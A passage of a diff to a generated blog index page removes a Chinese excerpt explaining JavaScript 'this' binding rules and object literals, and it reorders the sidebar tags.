class="line">&#125;</span><br><span class="line">var bar = new foo(2)</span><br><span class="line">console.log(bar.a)		// 2</span><br><span class="line">``` </span><br><span class="line">_ps：优先级------&gt;new绑定&gt;显示绑定&gt;隐式绑定&gt;默认绑定_</span><br><span class="line">### 判断this</span><br><span class="line">1、函数是否在new中调用(new绑定)？如果是的话this绑定是新的对象</span><br><span class="line">2、函数是否通过call、apply(显示绑定)或者硬绑定的调用？如果是的话this绑定的是制定对象</span><br><span class="line">3、函数是否在某个上下文对象中调用(隐式绑定)？如果是的话，this绑定到那个上下文对象中</span><br><span class="line">4、如果都不是的话，使用默认绑定，在严格模式下，就绑定到undefined上，否则绑定到全局对象上。</span><br><span class="line">##### 例外</span><br><span class="line">```bash</span><br><span class="line">function foo()&#123;</span><br><span class="line">	console.log(this.a)</span><br><span class="line">&#125;</span><br><span class="line">var a = 2</span><br><span class="line">foo.call(null)	// 默认绑定</span><br><span class="line">///////////////////////////////////</span><br><span class="line">// 科里化</span><br><span class="line">function foo(a, b) &#123;</span><br><span class="line">	console.log(&quot;a:&quot; + a +&quot; , b: &quot; + b)</span><br><span class="line">&#125;</span><br><span class="line">foo.apply(null, [2,3])	// a:2,b:3</span><br><span class="line">var bar = foo.bind(null, 2)</span><br><span class="line">bar(3)</span><br><span class="line">///////////////////////////////////</span><br><span class="line">// 间接引用</span><br><span class="line">function foo() &#123;</span><br><span class="line">	console.log(this.a)</span><br><span class="line">&#125;</span><br><span class="line">var a = 2</span><br><span class="line">var o = &#123;a:3, foo: foo&#125;</span><br><span class="line">var p = &#123;a:4&#125;</span><br><span class="line">o.foo() 	// 3</span><br><span class="line">(p.foo = o.foo)() 	// 2</span><br><span class="line">// 复制表达式p.foo = o.foo的返回值是目标函数的引用，因此调用位置是foo()而不是p.foo或者o.foo</span><br></pre></td></tr></table></figure></p>
-<h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>在string中，本身的字符串“I am a string”并不是一个对象，而是一个字面量，在使用了对象的方法之后，javascript会自动将其转换成一个string对象<br>null和undefined没有对应的构造函数，他们只有文字形式。相反，Date只有构造函数，没有文字形式。<br>对于Object，Array，Function和RegExp来说，无论是文字形式还是构造形式，他们都是对象不是字面量。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">JavaScript</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/09/06/you-dont-konwn-javascript-this/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -1482,10 +1611,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">code</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">随笔</a>
               </li>
              
@@ -1494,11 +1619,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">JavaScript</a>
+                <a href="javascript:void(0)" class="js-tag color5">HTTP</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">计算机网络</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">JavaScript</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1510,7 +1639,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">HTTP</a>
+                <a href="javascript:void(0)" class="js-tag color5">code</a>
               </li>
             
             <div class="clearfix"></div>
